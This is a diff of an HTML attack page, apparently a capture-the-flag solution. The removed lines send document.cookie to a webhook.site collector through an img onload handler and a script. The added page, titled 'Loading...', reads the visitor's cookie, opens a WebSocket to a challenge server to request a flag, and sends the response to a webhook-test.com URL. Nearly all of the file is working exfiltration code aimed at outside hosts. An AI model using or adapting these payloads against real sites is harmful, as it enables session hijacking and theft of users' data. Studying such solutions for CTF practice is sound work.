@@ -1,9 +1,28 @@
+<!DOCTYPE html>
 <html>
-  <body>
-      Bu bir CTF içindir!
-    <img src="https://webhook.site/b03e2036-0aa6-459d-a074-78cb3881d789" onload="fetch('https://webhook.site/b03e2036-0aa6-459d-a074-78cb3881d789?c=' + document.cookie);"/>
-    <script>
-      fetch("https://webhook.site/b03e2036-0aa6-459d-a074-78cb3881d789?c=" + document.cookie);
-    </script>
-  </body>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+<script>
+// First get admin's cookie when they visit
+const cookie = document.cookie;
+// Create WebSocket with the stolen cookie
+const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
+
+// When connection opens, send the getFlag command
+ws.onopen = () => {
+    // Use the admin's cookie for auth
+    document.cookie = cookie;
+    ws.send(JSON.stringify({message: '/getFlag'}));
+};
+
+// Listen for the flag
+ws.onmessage = (event) => {
+    const data = JSON.parse(event.data);
+    // Exfiltrate the flag
+    fetch('https://webhook-test.com/9dd7bced5491259bbecf04ddc4609dff/?flag=' + encodeURIComponent(data.message));
+};
+</script>
+</body>
 </html>
